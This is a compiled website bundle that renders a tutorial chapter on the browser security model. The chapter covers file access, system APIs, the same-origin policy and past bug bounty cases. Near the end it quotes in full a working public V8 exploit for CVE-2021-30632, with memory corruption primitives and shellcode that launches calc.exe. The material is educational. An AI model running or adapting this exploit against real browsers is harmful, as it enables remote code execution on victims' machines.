"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[830],{3905:(e,t,n)=>{n.d(t,{Zo:()=>d,kt:()=>x});var r=n(7294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function a(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,r,i=function(e,t){if(null==e)return{};var n,r,i={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var l=r.createContext({}),c=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):a(a({},t),e)),n},d=function(e){var t=c(e.components);return r.createElement(l.Provider,{value:t},e.children)},u="mdxType",p={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},h=r.forwardRef((function(e,t){var n=e.components,i=e.mdxType,o=e.originalType,l=e.parentName,d=s(e,["components","mdxType","originalType","parentName"]),u=c(n),h=i,x=u["".concat(l,".").concat(h)]||u[h]||p[h]||o;return n?r.createElement(x,a(a({ref:t},d),{},{components:n})):r.createElement(x,a({ref:t},d))}));function x(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var o=n.length,a=new Array(o);a[0]=h;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[u]="string"==typeof e?e:i,a[1]=s;for(var c=2;c<o;c++)a[c]=n[c];return r.createElement.apply(null,a)}return r.createElement.apply(null,n)}h.displayName="MDXCreateElement"},386:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>a,default:()=>p,frontMatter:()=>o,metadata:()=>s,toc:()=>c});var r=n(7462),i=(n(7294),n(3905));const o={sidebar_position:2,title:"Browser Security Model"},a="Browser Security Model",s={unversionedId:"ch1/browser-security-model",id:"ch1/browser-security-model",title:"Browser Security Model",description:"When discussing web frontend security issues, we must first have a basic understanding of the core of web frontend.",source:"@site/i18n/en/docusaurus-plugin-content-docs/current/ch1/02-browser-security-model.md",sourceDirName:"ch1",slug:"/ch1/browser-security-model",permalink:"/beyond-xss/en/ch1/browser-security-model",draft:!1,tags:[],version:"current",sidebarPosition:2,frontMatter:{sidebar_position:2,title:"Browser Security Model"},sidebar:"tutorialSidebar",previous:{title:"About This Series",permalink:"/beyond-xss/en/"},next:{title:"Starting with XSS for Frontend Security",permalink:"/beyond-xss/en/ch1/xss-introduction"}},l={},c=[{value:"Prohibit Proactive Access to Local Files",id:"prohibit-proactive-access-to-local-files",level:2},{value:"Prohibit Calling System APIs",id:"prohibit-calling-system-apis",level:2},{value:"Prohibition of Accessing Content from Other Web Pages",id:"prohibition-of-accessing-content-from-other-web-pages",level:2},{value:"Conclusion",id:"conclusion",level:2}],d={toc:c},u="wrapper";function p(e){let{components:t,...o}=e;return(0,i.kt)(u,(0,r.Z)({},d,o,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"browser-security-model"},"Browser Security Model"),(0,i.kt)("p",null,"When discussing web frontend security issues, we must first have a basic understanding of the core of web frontend."),(0,i.kt)("p",null,"The biggest difference in web frontend is that the code runs on the browser. The browser is responsible for rendering your HTML, parsing your CSS, and executing JavaScript code on the page."),(0,i.kt)("p",null,"For web frontend, its execution environment is the browser."),(0,i.kt)("p",null,"In the example below, the outermost black square represents the operating system, and the two green applications run on top of the operating system. The one on the right represents the browser, and the web frontend runs on top of the browser. The deeper the layer, the more restrictions there are:"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(5222).Z,width:"1032",height:"573"})),(0,i.kt)("p",null,"It is important to remember this point in order to understand why there are things that web frontend cannot do. It's not that I don't want to do it, but the browser doesn't allow me to do it. For example, the backend server can easily perform file read and write operations, but it may not be achievable in web frontend. Why is that? Because the browser doesn't allow us to do it."),(0,i.kt)("p",null,"Why can I see others implementing features about ____ (fill in anything), but I can't find a way to do it in frontend? It is very likely because the browser does not allow you to do it."),(0,i.kt)("p",null,"In summary:"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"If the browser doesn't give it to you, you can't get it. You just can't.")),(0,i.kt)("p",null,"So what security restrictions does the browser impose? What does it limit? Here are a few examples."),(0,i.kt)("h2",{id:"prohibit-proactive-access-to-local-files"},"Prohibit Proactive Access to Local Files"),(0,i.kt)("p",null,"For the backend, its code runs directly on the operating system, which means it is just a regular application. If there are no special permission restrictions, it can basically do whatever it wants. The whole machine is its playground."),(0,i.kt)("p",null,'But there are many restrictions for frontend. For example, it cannot "proactively" read and write files on the computer. Let\'s talk about what is possible. You can use ',(0,i.kt)("inlineCode",{parentName:"p"},"<input type=file>")," to allow users to select a file, and then use ",(0,i.kt)("inlineCode",{parentName:"p"},"FileReader")," to read the contents of the file, like this:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<input type="file" onchange="show(this)">\n\n<script>\nfunction show(input) {\n  const reader = new FileReader();\n  reader.onload = (event) => {\n    alert(event.target.result);\n  };\n  reader.readAsText(input.files[0]);\n  \n}\n<\/script>\n')),(0,i.kt)("p",null,"But you cannot directly use operations like ",(0,i.kt)("inlineCode",{parentName:"p"},"fetch('file:///data/index.html')")," to read files. If you do this, you will only see an error in the console:"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Not allowed to load local resource: file:///data/index.html")),(0,i.kt)("p",null,"Even using ",(0,i.kt)("inlineCode",{parentName:"p"},"window.open('file:///data/index.html')")," will result in the same error."),(0,i.kt)("p",null,"There are absolute reasons why browsers have restrictions. What would happen if frontend web pages could directly read files? I could directly read your ",(0,i.kt)("inlineCode",{parentName:"p"},"/etc/passwd"),", read your SSH key, read your configuration files and various files containing sensitive information. I could even find backup mnemonic phrases for encrypted cryptocurrency wallets on your computer. This would be a big problem, similar to being invaded by malware."),(0,i.kt)("p",null,"Therefore, it is very reasonable to prohibit JavaScript from actively accessing files. Otherwise, just by opening a webpage, all file contents would be exposed, leading to significant security issues."),(0,i.kt)("p",null,"In fact, such incidents have happened before. Let's look at a case."),(0,i.kt)("p",null,"In 2021, Renwa reported a vulnerability to Opera: ",(0,i.kt)("a",{parentName:"p",href:"https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser/"},"Bug Bounty Guest Post: Local File Read via Stored XSS in The Opera Browser"),", which exploited a vulnerability in the browser to read files."),(0,i.kt)("p",null,'Opera is a browser built on Chromium, and it has a feature called "Opera Pinboards" that allows users to create notes and share them with others. The URL of the note page is ',(0,i.kt)("inlineCode",{parentName:"p"},"opera:pinboards"),", which belongs to a special protocol and usually has special permissions."),(0,i.kt)("p",null,"When creating a note, you can include a link, for example: ",(0,i.kt)("inlineCode",{parentName:"p"},"https://blog.huli.tw"),". Renwa discovered that in addition to using normal links, you can also use links of the type ",(0,i.kt)("inlineCode",{parentName:"p"},"javascript:alert(1)")," to execute code, thus obtaining an XSS vulnerability under ",(0,i.kt)("inlineCode",{parentName:"p"},"opera:pinboards"),"!"),(0,i.kt)("p",null,"As mentioned earlier, there are special permissions under ",(0,i.kt)("inlineCode",{parentName:"p"},"opera:"),", such as being able to open ",(0,i.kt)("inlineCode",{parentName:"p"},"file://")," web pages and take screenshots of web pages to obtain the screenshot results. Therefore, you can use the XSS mentioned earlier to open local files, take screenshots, and send them to the attacker's server, achieving the goal of stealing files."),(0,i.kt)("p",null,"This bug was fixed within a day after it was reported, and the reporter received a $4000 reward."),(0,i.kt)("h2",{id:"prohibit-calling-system-apis"},"Prohibit Calling System APIs"),(0,i.kt)("p",null,"Regular applications can do many things, such as changing system settings or network settings, by using APIs provided by the system. However, JavaScript cannot do these things."),(0,i.kt)("p",null,'Or to be more precise, it is not that JavaScript itself cannot do it. It is just a programming language. It is because "the browser does not provide the corresponding API to the web frontend, so it cannot be done."'),(0,i.kt)("p",null,"When we execute JavaScript on the front end of a web page, we can only use what the browser provides us. For example, we can use ",(0,i.kt)("inlineCode",{parentName:"p"},"fetch()")," to send a request or use ",(0,i.kt)("inlineCode",{parentName:"p"},"setTimeout")," to set a timer. These are interfaces provided by the browser that allow us to perform certain actions."),(0,i.kt)("p",null,"If we want to use system APIs, we can only do so if the browser also provides corresponding interfaces. Otherwise, JavaScript on the web page cannot access those functionalities."),(0,i.kt)("p",null,"For example, the browser provides the Web Bluetooth API for communication with Bluetooth devices. Therefore, JavaScript on the web page can be used to develop applications related to Bluetooth. Another example is the MediaDevices API, which allows JavaScript to access data from devices such as microphones and cameras, enabling the development of related applications."),(0,i.kt)("p",null,"When browsers provide these APIs, they also implement permission management mechanisms. Usually, a notification will pop up asking the user to actively agree and grant permission before allowing the web page to access certain resources."),(0,i.kt)("h2",{id:"prohibition-of-accessing-content-from-other-web-pages"},"Prohibition of Accessing Content from Other Web Pages"),(0,i.kt)("p",null,"This can be considered one of the most important security assumptions of browsers. A web page should never have permission to access the content of other web pages. This is easy to understand because if this were allowed, one could directly read emails from ",(0,i.kt)("inlineCode",{parentName:"p"},"mail.google.com")," by accessing ",(0,i.kt)("inlineCode",{parentName:"p"},"blog.huli.tw"),", which is obviously not secure."),(0,i.kt)("p",null,"Therefore, each web page has permissions only for itself. It can modify its own HTML and execute desired JavaScript code, but it should not access data from other web pages. This is known as the same-origin policy (SOP)."),(0,i.kt)("p",null,'Moreover, this "data" is not limited to just "content on the page," but also includes not being able to access "the URLs of other pages."'),(0,i.kt)("p",null,"For example, if the following code is executed on ",(0,i.kt)("inlineCode",{parentName:"p"},"github.com"),":"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-js"},"var win = window.open('https://blog.huli.tw')\nsetTimeout(() => {\n  console.log(win.location.href)\n}, 3000)\n")),(0,i.kt)("p",null,"The following error message will be displayed:"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(7018).Z,width:"860",height:"235"})),(0,i.kt)("p",null,"The message states:"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},'Uncaught DOMException: Blocked a frame with origin "',(0,i.kt)("a",{parentName:"p",href:"https://github.com%22"},'https://github.com"')," from accessing a cross-origin frame.")),(0,i.kt)("p",null,"This means that you cannot access content from other pages, including their URLs."),(0,i.kt)("p",null,"Although this may seem very basic and necessary, implementing this functionality in browsers is not that easy. Browsers have undergone numerous attacks and have implemented various defense measures and architectural adjustments to become increasingly secure and meet these security requirements."),(0,i.kt)("p",null,"For example, in January 2018, Google's Project Zero disclosed significant vulnerabilities called Meltdown and Spectre, which allowed reading data from the same process through CPU flaws."),(0,i.kt)("p",null,"Chrome browser responded to this vulnerability by adjusting its architecture to be more secure. It ensured that different web pages, regardless of how they are loaded (including images and iframes), are processed in separate processes. This series of security measures is known as Site Isolation, and you can find more detailed explanations on the ",(0,i.kt)("a",{parentName:"p",href:"https://www.chromium.org/Home/chromium-security/site-isolation/"},"Chromium website"),". It will also be mentioned again in subsequent articles."),(0,i.kt)("p",null,'Regarding the point of "not being able to access content from other pages," let\'s look at an example of bypassing this restriction.'),(0,i.kt)("p",null,"In 2022, joaxcar reported a vulnerability to Chromium: ",(0,i.kt)("a",{parentName:"p",href:"https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&q=subdomain%20host%20leak&can=1"},"Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank"),". This vulnerability allowed reading cross-origin URLs using an iframe."),(0,i.kt)("p",null,"Suppose the web page is ",(0,i.kt)("inlineCode",{parentName:"p"},"a.example.com")," and contains an iframe with the URL ",(0,i.kt)("inlineCode",{parentName:"p"},"b.example.com"),". By redirecting the iframe to ",(0,i.kt)("inlineCode",{parentName:"p"},"about:blank")," using ",(0,i.kt)("inlineCode",{parentName:"p"},"frames[0].location = 'about:blank'"),", the iframe becomes same-origin with ",(0,i.kt)("inlineCode",{parentName:"p"},"a.example.com"),". At this point, accessing the iframe's navigation history using ",(0,i.kt)("inlineCode",{parentName:"p"},"frames[0].navigation.entries()")," allows retrieving the original URL of ",(0,i.kt)("inlineCode",{parentName:"p"},"b.example.com"),"."),(0,i.kt)("p",null,"This should not happen. When an iframe is redirected to another URL, ",(0,i.kt)("inlineCode",{parentName:"p"},"navigation.entries()")," should be cleared. Therefore, this is a bug."),(0,i.kt)("p",null,"This is an example of bypassing the same-origin policy. Although it only allows reading URLs, it is still a security vulnerability and earned a reward of $2000."),(0,i.kt)("h2",{id:"conclusion"},"Conclusion"),(0,i.kt)("p",null,"The main point of this article is that \"if the browser doesn't give it to you, you simply can't get it.\" This is a key difference between web front-end development and other execution environments. Conversely, if you manage to obtain something that the browser doesn't provide, it means you have found a vulnerability in the browser and can report it for a reward."),(0,i.kt)("p",null,"So, what is the most severe browser vulnerability? It is the one that allows attackers to bypass browser restrictions and perform actions that violate the browser's security assumptions."),(0,i.kt)("p",null,"For example, as mentioned earlier, SOP bypass can violate the same-origin policy and access data from other web pages. Although the previous example only demonstrated the ability to read URLs, more sophisticated attacks can even access the content itself. For instance, imagine you open ",(0,i.kt)("inlineCode",{parentName:"p"},"https://blog.huli.tw")," to read my blog post, but behind the scenes, my website secretly executes JavaScript code that exploits the SOP bypass vulnerability to read all the content of your emails on ",(0,i.kt)("inlineCode",{parentName:"p"},"https://mail.google.com"),"."),(0,i.kt)("p",null,"Sounds terrifying, right? But it gets even scarier."),(0,i.kt)("p",null,"The most severe type of vulnerability allows attackers to execute arbitrary commands on a computer using JavaScript. This type of vulnerability is called Remote Code Execution (RCE)."),(0,i.kt)("p",null,"Let's provide another example. Suppose you visit my blog, read some articles, and then close the page. However, at that moment, I can already issue commands to your computer. I can steal all the data from your computer or secretly install malicious software. In the past, there have been numerous cases of such vulnerabilities being exploited. Every now and then, browsers expose these most severe vulnerabilities. As regular users, our best course of action is to update our browsers promptly to minimize exposure to such dangers."),(0,i.kt)("p",null,"In September 2021, a vulnerability with the identifier CVE-2021-30632 was discovered. It is the aforementioned RCE vulnerability. By simply opening a webpage using Chrome browser (version earlier than v93), an attacker can directly invade your computer and execute commands."),(0,i.kt)("p",null,"Are you curious about what JavaScript code typically looks like in these types of attacks? How do they exploit certain functionalities to ultimately execute arbitrary code through the browser?"),(0,i.kt)("p",null,"Below is one of the exploits for CVE-2021-30632, sourced from: ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/CrackerCat/CVE-2021-30632/blob/main/CVE-2021-30632.html"},"https://github.com/CrackerCat/CVE-2021-30632/blob/main/CVE-2021-30632.html")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<head>\n  <title></title>\n</head>\n<body>\n<script type="text/javascript">\n\nfunction gc() {\n  for(var i = 0;i < ((1024*1024)); i++) {\n    new String();\n  }\n}\n\nvar code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);\nvar module = new WebAssembly.Module(code);\nvar instance = new WebAssembly.Instance(module);\nvar main = instance.exports.main;\n\nfunction foo(y) {\n  x = y;\n}\n\nfunction oobRead() {\n  //addrOf b[0] and addrOf writeArr::elements\n  return [x[20],x[24]];\n}\n\nfunction oobWrite(addr) {\n  x[24] = addr;\n}\n\nvar arr0 = new Array(10); arr0.fill(1);arr0.a = 1;\nvar arr1 = new Array(10); arr1.fill(2);arr1.a = 1;\nvar arr2 = new Array(10); arr2.fill(3); arr2.a = 1;\nvar x = arr0;\n\ngc();gc();\n  \nvar arr = new Array(30); arr.fill(4); arr.a = 1;\nvar b = new Array(1); b.fill(1);\nvar writeArr = [1.1];\n\nfor (let i = 0; i < 19321; i++) {\n  if (i == 19319) arr2[0] = 1.1;\n  foo(arr1);\n}\n\nx[0] = 1.1;\n\nfor (let i = 0; i < 20000; i++) {\n  oobRead();\n}\n\nfor (let i = 0; i < 20000; i++) oobWrite(1.1);\nfoo(arr);\n\nvar view = new ArrayBuffer(24);\nvar dblArr = new Float64Array(view);\nvar intView = new Int32Array(view);\nvar bigIntView = new BigInt64Array(view);\nb[0] = instance;\nvar addrs = oobRead();\n\nfunction ftoi32(f) {\n  dblArr[0] = f;\n  return [intView[0], intView[1]];\n}\n\nfunction i32tof(i1, i2) {\n  intView[0] = i1;\n  intView[1] = i2;\n  return dblArr[0];\n}\n\nfunction itof(i) {\n  bigIntView = BigInt(i);\n  return dblArr[0];\n}\n\nfunction ftoi(f) {\n  dblArr[0] = f;\n  return bigIntView[0];\n}\n\n\ndblArr[0] = addrs[0];\ndblArr[1] = addrs[1];\n\nfunction addrOf(obj) {\n  b[0] = obj;\n  let addrs = oobRead();\n  dblArr[0] = addrs[0];\n  return intView[1]; \n}\n\nfunction arbRead(addr) {\n  [elements, addr1] = ftoi32(addrs[1]);\n  oobWrite(i32tof(addr,addr1));\n  return writeArr[0];\n}\n\nfunction arbRead1(addr) {\n  [addr1, elements] = ftoi32(addrs[1]);\n  oobWrite(i32tof(addr1, addr));\n  return writeArr[0];\n}\n\nfunction writeShellCode(rwxAddr, shellArr) {\n  var intArr = new Uint8Array(400);\n  var intArrAddr = addrOf(intArr);\n  var intBackingStore = ftoi(arbRead(intArrAddr + 0x20));\n  [elements, addr1] = ftoi32(addrs[1]);\n  oobWrite(i32tof(intArrAddr + 0x20, addr1));\n  writeArr[0] = rwxAddr;\n  for (let i = 0; i < shellArr.length; i++) {\n    intArr[i] = shellArr[i];\n  }\n}\n\nfunction writeShellCode1(rwxAddr, shellArr) {\n  var intArr = new Uint8Array(400);\n  var intArrAddr = addrOf(intArr);\n  var intBackingStore = ftoi(arbRead(intArrAddr + 0x20));\n \n  [addr1, elements] = ftoi32(addrs[1]);\n  oobWrite(i32tof(addr1, intArrAddr + 0x20));\n  writeArr[0] = rwxAddr;\n  for (let i = 0; i < shellArr.length; i++) {\n    intArr[i] = shellArr[i];\n  }\n}\n\nvar other_method = false;\nvar instanceAddr = addrOf(instance);\nvar elementsAddr = ftoi32(addrs[1])[0];\n\nif((elementsAddr & 0xFFFF) == 0x222D) {\n  other_method = true;\n  elementsAddr = ftoi32(addrs[1])[1];\n}\n\nvar shellCode = [0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,\n      0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,\n      0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n      0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,\n      0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,\n      0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n      0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,\n      0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,\n      0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n      0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,\n      0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,\n      0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n      0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,\n      0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n      0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,\n      0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,\n      0x65, 0x78, 0x65, 0x00];\n\nvar rwxAddr;\nif(other_method == false) {\n  rwxAddr = arbRead(instanceAddr + 0x60);\n  writeShellCode(rwxAddr, shellCode);\n}\nelse {\n  rwxAddr = arbRead1(instanceAddr + 0x60);\n  writeShellCode1(rwxAddr, shellCode);\n}\n\nmain();\n\n<\/script>\n</body>\n</html>\n')),(0,i.kt)("p",null,"Since the vulnerability exists within V8, you can see that the code above performs many operations that may seem incomprehensible. These operations are usually designed to satisfy certain conditions that trigger issues in V8. However, providing a detailed explanation is beyond the scope of this article. If you're interested, you can refer to the detailed analysis written by the GitHub security team: ",(0,i.kt)("a",{parentName:"p",href:"https://securitylab.github.com/research/in_the_wild_chrome_cve_2021_30632/"},"Chrome in-the-wild bug analysis: CVE-2021-30632")),(0,i.kt)("p",null,"By the way, some engineers who are not familiar with the limitations of JavaScript often try to accomplish things that are fundamentally impossible with JavaScript."),(0,i.kt)("p",null,'Once you understand the basic security model of browsers, when faced with tasks that cannot be achieved, you can confidently tell the project manager, "Yes, this functionality cannot be implemented on the web front-end because the browser does not allow it," instead of searching everywhere for ways to call non-existent APIs.'))}p.isMDXComponent=!0},5222:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/02-01-91bc520c1e0723ec4c515215194f7edc.png"},7018:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/02-02-dadf0f1a6eca6cefb764a92d33cc3be4.png"}}]);